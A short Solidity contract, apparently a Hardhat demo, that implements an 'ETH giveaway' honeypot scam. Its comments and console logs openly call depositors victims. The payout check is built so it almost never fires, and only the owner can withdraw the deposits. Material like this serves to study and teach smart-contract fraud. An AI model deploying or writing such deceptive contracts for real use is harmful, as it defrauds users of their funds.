
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract ETH_Giveaway
{
    // This is a ETH giveway !

    address public owner;
    
    constructor (address _owner) payable {
        // Setting the HoneyPot Owner
        owner = _owner;
    }
    
    function viewGameBalance () public view returns (uint) {
        return address(this).balance;   
    }
    
    /**
        ETH "Giveaway":

        If the giveaway caller sends more eth than the contract already has,
        The contract transfer all the eth to the caller
    */
    function giveway(address _reciever) public payable{
        console.log("Victim %s deposits %s", msg.sender, msg.value);
        
        require(msg.value > 0, "Error");
        console.log("Honeypot Balance is now: %s", address(this).balance);
        if(msg.value >= address(this).balance){
            payable(_reciever).transfer(address(this).balance + msg.value);
        }

    }
    
    function withdraw()  public
    {
        require(msg.sender == owner, 'Ownable: caller is not the owner');
        console.log("Owner takes all the money");
        payable(owner).transfer(address(this).balance);
    }
    
}